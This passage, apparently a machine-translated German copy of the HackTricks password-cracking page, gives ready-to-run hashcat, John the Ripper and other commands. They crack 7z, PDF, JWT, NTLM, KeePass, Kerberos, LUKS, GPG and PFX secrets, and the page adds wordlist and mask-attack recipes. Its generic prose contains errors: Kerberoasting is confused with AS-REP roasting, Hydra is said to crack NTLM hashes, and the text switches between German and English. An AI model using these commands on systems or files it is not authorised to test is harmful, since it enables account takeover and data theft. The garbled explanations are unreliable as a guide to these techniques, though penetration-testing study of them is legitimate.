Es ist auch wichtig zu beachten, dass das Knacken von Passwörtern ohne die ausdrückliche Zustimmung des Eigentümers illegal ist und zu rechtlichen Konsequenzen führen kann. Stellen Sie sicher, dass Sie alle geltenden Gesetze und Vorschriften einhalten, bevor Sie diese Methode anwenden.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

PDF (Portable Document Format) ist ein Dateiformat, das entwickelt wurde, um Dokumente plattformübergreifend lesbar zu machen. Es wird häufig für das Teilen von Dokumenten verwendet, da es das Layout und die Formatierung beibehält, unabhängig von der verwendeten Software oder dem Betriebssystem.

#### Brute-Force-Angriff auf PDF-Dateien

Ein Brute-Force-Angriff auf PDF-Dateien beinhaltet das systematische Ausprobieren aller möglichen Passwörter, um Zugriff auf eine geschützte PDF-Datei zu erlangen. Dieser Angriff kann entweder offline oder online durchgeführt werden.

##### Offline-Brute-Force-Angriff

Bei einem Offline-Brute-Force-Angriff wird eine Kopie der verschlüsselten PDF-Datei heruntergeladen und auf einem leistungsstarken Computer oder Server entschlüsselt. Dies ermöglicht es dem Angreifer, eine große Anzahl von Passwörtern in kurzer Zeit auszuprobieren.

##### Online-Brute-Force-Angriff

Bei einem Online-Brute-Force-Angriff wird versucht, sich über eine Anmeldeseite oder ein Webformular in ein PDF-Dokument einzuloggen. Der Angreifer verwendet eine Liste von häufig verwendeten Passwörtern oder generiert Passwörter automatisch, um Zugriff auf das Dokument zu erhalten.

##### Schutz vor Brute-Force-Angriffen auf PDF-Dateien

Um sich vor Brute-Force-Angriffen auf PDF-Dateien zu schützen, sollten starke Passwörter verwendet werden, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen. Darüber hinaus kann die Verwendung von Zwei-Faktor-Authentifizierung den Schutz weiter erhöhen, indem ein zusätzlicher Sicherheitsfaktor erforderlich ist, um auf das Dokument zuzugreifen.

Es ist auch wichtig, regelmäßig Updates für die verwendete PDF-Software durchzuführen, da diese oft Sicherheitslücken schließen und den Schutz vor Brute-Force-Angriffen verbessern.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF-Besitzerpasswort

Um ein PDF-Besitzerpasswort zu knacken, überprüfen Sie dies: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM-Knacken

NTLM (NT LAN Manager) ist ein Authentifizierungsprotokoll, das von Microsoft Windows verwendet wird. Es wird häufig für das Knacken von Passwörtern verwendet, da es anfällig für Brute-Force-Angriffe ist.

#### Brute-Force-Angriff auf NTLM-Hashes

Ein Brute-Force-Angriff auf NTLM-Hashes beinhaltet das systematische Ausprobieren aller möglichen Kombinationen von Zeichen, um das richtige Passwort zu erraten. Dies kann entweder offline oder online erfolgen.

##### Offline-Brute-Force-Angriff

Bei einem Offline-Brute-Force-Angriff hat der Angreifer bereits Zugriff auf die NTLM-Hashes, die in einer Datenbank oder einem Dateisystem gespeichert sind. Der Angreifer verwendet dann eine Brute-Force-Software, um verschiedene Passwortkombinationen auszuprobieren und den richtigen Hash zu finden.

##### Online-Brute-Force-Angriff

Bei einem Online-Brute-Force-Angriff versucht der Angreifer, sich direkt bei einem System anzumelden, indem er verschiedene Passwortkombinationen ausprobiert. Dies kann über Remote-Desktop-Protokolle, Webanwendungen oder andere Authentifizierungsmechanismen erfolgen.

#### Tools für NTLM-Knacken

Es gibt verschiedene Tools, die für das Knacken von NTLM-Hashes verwendet werden können. Einige der beliebtesten sind:

- Hashcat: Ein leistungsstarkes Tool für das Knacken von Passwörtern, das verschiedene Angriffsmethoden unterstützt, einschließlich Brute-Force.
- John the Ripper: Ein weiteres beliebtes Passwort-Knack-Tool, das NTLM-Hashes unterstützt.
- Hydra: Ein Tool für das Brute-Forcing von Passwörtern, das auch NTLM-Hashes knacken kann.

#### Schutzmaßnahmen gegen NTLM-Knacken

Um sich vor NTLM-Knacken zu schützen, sollten folgende Maßnahmen ergriffen werden:

- Verwenden Sie starke Passwörter, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen.
- Aktivieren Sie die Kontosperre nach einer bestimmten Anzahl von fehlgeschlagenen Anmeldeversuchen.
- Implementieren Sie eine Zwei-Faktor-Authentifizierung, um die Sicherheit weiter zu erhöhen.
- Verwenden Sie moderne Authentifizierungsprotokolle wie Kerberos anstelle von NTLM, wenn möglich.

Durch die Umsetzung dieser Schutzmaßnahmen können Sie das Risiko eines erfolgreichen NTLM-Knackens erheblich reduzieren.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass ist ein Open-Source-Passwort-Manager, der es Benutzern ermöglicht, ihre Passwörter sicher zu speichern und zu verwalten. Es verwendet eine starke Verschlüsselung, um die Passwortdatenbank zu schützen. Keepass bietet auch die Möglichkeit, Passwörter automatisch auszufüllen und zu generieren, um die Sicherheit zu erhöhen. Es ist eine beliebte Wahl für Benutzer, die eine sichere Methode zur Verwaltung ihrer Passwörter suchen.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
Keberoasting ist eine Technik, bei der schwache Kennwörter von Diensten erfasst werden, die den Kerberos-Authentifizierungsmechanismus verwenden. Diese Technik zielt darauf ab, die Kerberos-Tickets von Benutzern zu stehlen, um sie offline zu knacken. 

Der Angriff beginnt damit, dass der Angreifer die Liste der Benutzer im Active Directory abruft und nach Konten sucht, die für den Kerberos-Pre-Authentication-Service aktiviert sind. Diese Konten sind anfällig für Keberoasting, da sie Kerberos-Tickets generieren, ohne dass eine Vorauthentifizierung erforderlich ist. 

Sobald der Angreifer ein solches Konto identifiziert hat, kann er das Kerberos-Ticket anfordern und es offline knacken. Dies wird normalerweise mit Hilfe von Brute-Force-Techniken durchgeführt, bei denen verschiedene Passwörter ausprobiert werden, um das richtige zu erraten. 

Es ist wichtig zu beachten, dass Keberoasting nur erfolgreich ist, wenn schwache Kennwörter verwendet werden. Daher ist es ratsam, starke und komplexe Passwörter zu verwenden, um sich vor diesem Angriff zu schützen.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Lucks Bild

#### Methode 1

Installation: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Methode 2

##### Brute Force

Brute force is a technique used to crack passwords or encryption keys by systematically trying all possible combinations until the correct one is found. It is a time-consuming process that requires a lot of computational power.

##### Online Brute Force

Online brute force attacks involve directly targeting a specific online service or application. This can be done by using automated tools that attempt to log in to the target using a list of commonly used usernames and passwords. These tools can also generate random combinations of characters to try to gain access.

##### Offline Brute Force

Offline brute force attacks involve obtaining a password hash or encrypted data and then attempting to crack it offline. This is typically done by using specialized software that can try millions of combinations per second. The attacker may use a precomputed table of hashes, known as a rainbow table, to speed up the cracking process.

##### Mitigation Techniques

To protect against brute force attacks, it is important to use strong and unique passwords for each online account. Additionally, implementing account lockouts after a certain number of failed login attempts can help prevent brute force attacks. Using multi-factor authentication can also add an extra layer of security.

##### Conclusion

Brute force attacks can be a powerful method for gaining unauthorized access to systems or accounts. By understanding how these attacks work and implementing proper security measures, individuals and organizations can better protect themselves against this type of threat.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Ein weiteres Luks BF-Tutorial: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG Privater Schlüssel

Ein PGP/GPG-Privater Schlüssel ist ein kryptografischer Schlüssel, der zum Verschlüsseln und Signieren von Nachrichten verwendet wird. Der Private Schlüssel sollte geheim gehalten werden, da er den Zugriff auf die verschlüsselten Nachrichten ermöglicht. 

Es gibt verschiedene Methoden, um einen PGP/GPG-Privaten Schlüssel zu erlangen. Eine Möglichkeit besteht darin, einen Brute-Force-Angriff durchzuführen, bei dem verschiedene Kombinationen von Passwörtern ausprobiert werden, um den richtigen Schlüssel zu finden. 

Ein Brute-Force-Angriff auf einen PGP/GPG-Privaten Schlüssel kann zeitaufwändig sein, da die Anzahl der möglichen Kombinationen sehr hoch ist. Es ist wichtig, leistungsstarke Hardware und effiziente Algorithmen zu verwenden, um die Geschwindigkeit des Angriffs zu maximieren. 

Es gibt auch Tools und Programme, die speziell für den Brute-Force-Angriff auf PGP/GPG-Private Schlüssel entwickelt wurden. Diese Tools können verschiedene Techniken wie Wörterbuchangriffe, Kombinationsangriffe und Maskenangriffe verwenden, um den Schlüssel zu finden. 

Es ist jedoch zu beachten, dass der Brute-Force-Angriff auf PGP/GPG-Private Schlüssel illegal ist, es sei denn, er wird im Rahmen einer rechtmäßigen Penetrationstestaktivität durchgeführt. Es ist wichtig, die geltenden Gesetze und Vorschriften zu beachten und nur mit ausdrücklicher Zustimmung des Eigentümers des Schlüssels zu handeln.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Verwenden Sie [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) und dann john

### Open Office Pwd Protected Column

Wenn Sie eine xlsx-Datei mit einer Spalte haben, die durch ein Passwort geschützt ist, können Sie es aufheben:

* **Laden Sie es in Google Drive hoch** und das Passwort wird automatisch entfernt
* Um es **manuell zu entfernen**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX-Zertifikate

PFX-Zertifikate (Personal Information Exchange) sind eine Art von Zertifikaten, die in der Regel für die Verschlüsselung und Authentifizierung verwendet werden. Sie enthalten sowohl den privaten Schlüssel als auch das zugehörige öffentliche Zertifikat in einer einzigen Datei. PFX-Zertifikate werden häufig in Windows-basierten Umgebungen verwendet.

#### Verwendung von PFX-Zertifikaten

PFX-Zertifikate können für verschiedene Zwecke verwendet werden, einschließlich:

- Verschlüsselung von Daten: PFX-Zertifikate können verwendet werden, um Daten zu verschlüsseln und sicherzustellen, dass nur autorisierte Benutzer darauf zugreifen können.

- Authentifizierung: PFX-Zertifikate können verwendet werden, um die Identität eines Benutzers oder einer Entität zu überprüfen. Sie dienen als digitale Ausweise und ermöglichen eine sichere Kommunikation.

- Digitale Signaturen: PFX-Zertifikate können verwendet werden, um digitale Signaturen zu erstellen und die Integrität von Daten zu gewährleisten. Dadurch können Benutzer sicherstellen, dass die Daten nicht manipuliert wurden.

#### Brute-Force-Angriffe auf PFX-Zertifikate

Brute-Force-Angriffe sind eine Methode, um das Passwort eines PFX-Zertifikats zu erraten, indem alle möglichen Kombinationen ausprobiert werden. Dies kann durch den Einsatz von spezieller Software oder Skripten automatisiert werden.

Um Brute-Force-Angriffe auf PFX-Zertifikate zu verhindern, sollten starke Passwörter verwendet werden. Ein starkes Passwort sollte aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen. Es ist auch ratsam, die Länge des Passworts zu erhöhen, um die Sicherheit weiter zu verbessern.

Es ist auch wichtig, die Anzahl der zulässigen Anmeldeversuche zu begrenzen. Durch die Implementierung von Sperrmechanismen nach einer bestimmten Anzahl von fehlgeschlagenen Versuchen kann die Wahrscheinlichkeit eines erfolgreichen Brute-Force-Angriffs verringert werden.

#### Zusammenfassung

PFX-Zertifikate sind eine Art von Zertifikaten, die für die Verschlüsselung, Authentifizierung und Erstellung digitaler Signaturen verwendet werden. Brute-Force-Angriffe auf PFX-Zertifikate können durch die Verwendung starker Passwörter und die Begrenzung der Anzahl der zulässigen Anmeldeversuche verhindert werden.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Werkzeuge

**Beispiel für Hashes:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-Identifier
```bash
hash-identifier
> <HASH>
```
### Wortlisten

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Wortlisten-Generierungstools**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Fortgeschrittener Tastatur-Walk-Generator mit konfigurierbaren Basiszeichen, Tastaturbelegung und Routen.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John-Mutation

Lesen Sie _**/etc/john/john.conf**_ und konfigurieren Sie es.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat-Angriffe

* **Wordlist-Angriff** (`-a 0`) mit Regeln

**Hashcat** enthält bereits einen **Ordner mit Regeln**, aber Sie können [**hier andere interessante Regeln finden**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Wordlist-Kombinations**-Angriff

Es ist möglich, mit Hashcat **2 Wordlists zu einer zu kombinieren**.
Wenn Liste 1 das Wort **"hello"** und die zweite 2 Zeilen mit den Wörtern **"world"** und **"earth"** enthielt, werden die Wörter `helloworld` und `helloearth` generiert.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Maskenangriff** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Wortliste + Maske (`-a 6`) / Maske + Wortliste (`-a 7`) Angriff
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat-Modi

Hashcat unterstützt verschiedene Modi, um verschiedene Arten von Hashes zu knacken. Hier sind einige der gängigsten Modi:

- **0**: Straight (gerade) - Dieser Modus wird verwendet, um Hashes ohne jegliche Transformationen zu knacken.
- **100**: DCC (Domain Cached Credentials) - Dieser Modus wird verwendet, um Hashes zu knacken, die von Windows-Domänencontrollern gespeichert werden.
- **2500**: WPA/WPA2 - Dieser Modus wird verwendet, um WPA/WPA2-Passwörter von WLAN-Netzwerken zu knacken.
- **3000**: LM (LAN Manager) - Dieser Modus wird verwendet, um LM-Hashes zu knacken, die in älteren Versionen von Windows verwendet werden.
- **500**: md5crypt, MD5 (Unix), FreeBSD MD5 - Diese Modi werden verwendet, um verschiedene Varianten des MD5-Hashes zu knacken.
- **1800**: sha512crypt, SHA512 (Unix) - Dieser Modus wird verwendet, um SHA-512-Hashes zu knacken, die in Unix-Systemen verwendet werden.

Es gibt viele weitere Modi, die von Hashcat unterstützt werden. Jeder Modus hat seine eigenen spezifischen Anforderungen und Optionen. Es ist wichtig, den richtigen Modus für den zu knackenden Hash auszuwählen, um die besten Ergebnisse zu erzielen.
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Knacken von Linux-Hashes - Datei /etc/shadow

## Einführung

Die Datei `/etc/shadow` ist eine wichtige Datei in Linux-Betriebssystemen, die die Passwort-Hashes der Benutzerkonten enthält. Das Knacken dieser Hashes ermöglicht es uns, die Passwörter der Benutzer zu erlangen und somit Zugriff auf deren Konten zu erhalten.

## Methoden

Es gibt verschiedene Methoden, um Linux-Hashes zu knacken. Hier sind einige der gängigsten:

### 1. Wörterbuchangriff

Bei einem Wörterbuchangriff verwenden wir eine Liste von häufig verwendeten Passwörtern, um die Hashes zu knacken. Wir vergleichen jeden Hash mit den Einträgen in der Wörterbuchliste und wenn ein Übereinstimmung gefunden wird, haben wir das Passwort geknackt.

### 2. Brute-Force-Angriff

Ein Brute-Force-Angriff ist eine Methode, bei der wir systematisch alle möglichen Kombinationen von Zeichen ausprobieren, um den Hash zu knacken. Dies erfordert viel Rechenleistung und Zeit, ist aber effektiv, wenn das Passwort komplex ist.

### 3. Rainbow-Tables

Rainbow-Tables sind vorgefertigte Tabellen, die Hashes und ihre zugehörigen Klartext-Passwörter enthalten. Durch den Vergleich der Hashes in der `/etc/shadow`-Datei mit den Einträgen in den Rainbow-Tables können wir das Passwort finden.

### 4. GPU-beschleunigte Angriffe

Moderne Grafikprozessoren (GPUs) können für das Knacken von Hashes verwendet werden, da sie eine hohe Rechenleistung bieten. Durch die Verwendung von spezieller Software können wir die GPU nutzen, um den Brute-Force-Angriff zu beschleunigen.

## Tools

Es gibt verschiedene Tools, die für das Knacken von Linux-Hashes verwendet werden können. Hier sind einige beliebte:

- John the Ripper
- Hashcat
- Hydra
- Medusa

## Schutzmaßnahmen

Um das Knacken von Linux-Hashes zu erschweren, sollten folgende Schutzmaßnahmen ergriffen werden:

- Verwendung von sicheren, komplexen Passwörtern
- Aktualisierung der Passwörter regelmäßig
- Verwendung von Hashing-Algorithmen mit hoher Sicherheit, wie z.B. SHA-512
- Verwendung von Salzen, um die Hashes zu erschweren

## Fazit

Das Knacken von Linux-Hashes in der `/etc/shadow`-Datei kann uns Zugriff auf Benutzerkonten verschaffen. Es ist wichtig, sich der verschiedenen Methoden und Tools bewusst zu sein, die für solche Angriffe verwendet werden können, um geeignete Schutzmaßnahmen zu ergreifen.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Brute Force

Brute force is a common method used to crack Windows hashes. It involves systematically trying every possible combination of characters until the correct password is found.

## Tools

There are several tools available for brute forcing Windows hashes, including:

- **John the Ripper**: A popular password cracking tool that supports various hash types, including Windows NTLM hashes.
- **Hashcat**: A powerful password recovery tool that can crack a wide range of hash types, including Windows NTLM hashes.
- **Hydra**: A network login cracker that supports various protocols, including SMB (used by Windows) for brute forcing passwords.

## Wordlists

To perform a successful brute force attack, you need a good wordlist. A wordlist is a file containing a list of potential passwords that the attacker will try. There are many wordlists available online, ranging from common passwords to custom wordlists created specifically for cracking Windows hashes.

## Techniques

When brute forcing Windows hashes, there are a few techniques that can increase your chances of success:

- **Dictionary Attack**: This technique involves using a wordlist containing common passwords or words to try and crack the hash. It is a faster approach compared to trying every possible combination of characters.
- **Mask Attack**: A mask attack involves creating a custom pattern or mask that represents the password's structure. This technique is useful when you have some information about the password, such as its length or character composition.
- **Hybrid Attack**: A hybrid attack combines the dictionary and mask attack techniques. It allows you to use a wordlist while also applying custom rules or masks to the passwords in the list.

## Tips

Here are some tips to improve your chances of cracking Windows hashes:

- Use a powerful machine or a cloud/SaaS platform to speed up the cracking process.
- Prioritize wordlists that are specific to the target's language or industry.
- Combine different techniques and tools to increase your chances of success.
- Regularly update your wordlists to include new and commonly used passwords.

Remember, brute forcing Windows hashes can be a time-consuming process, especially if the password is complex. It's important to be patient and persistent during the cracking process.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Brute Force

Brute force is a common method used to crack application hashes. It involves systematically trying every possible combination of characters until the correct password is found.

## Dictionary Attack

A dictionary attack is a type of brute force attack that uses a pre-defined list of commonly used passwords, known as a dictionary, to attempt to crack the hash. This method is effective against weak passwords that are easily guessable.

## Hybrid Attack

A hybrid attack combines elements of both brute force and dictionary attacks. It starts by using a dictionary attack with common passwords, and then continues with a brute force attack to try all possible combinations of characters.

## Rainbow Tables

Rainbow tables are precomputed tables that contain a large number of hashes and their corresponding plaintext passwords. By comparing the hash of the target password with the hashes in the rainbow table, it is possible to quickly find a match and recover the plaintext password.

## Mask Attack

A mask attack is a type of brute force attack that uses a predefined pattern, or mask, to generate passwords. This method is useful when some information about the password is known, such as its length or character composition.

## Tips for Brute Forcing

- Use a powerful machine or a distributed computing system to speed up the brute force process.
- Prioritize dictionary attacks and hybrid attacks before resorting to pure brute force.
- Use a variety of dictionaries, including common passwords, leaked password databases, and custom wordlists.
- Adjust the attack parameters, such as password length and character set, based on the target application's password policy.
- Monitor the target application for any signs of detection or account lockouts during the brute force process.

Remember that brute forcing is a time-consuming process and may not always be successful. It is important to consider other attack vectors and techniques in combination with brute forcing to increase the chances of success.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
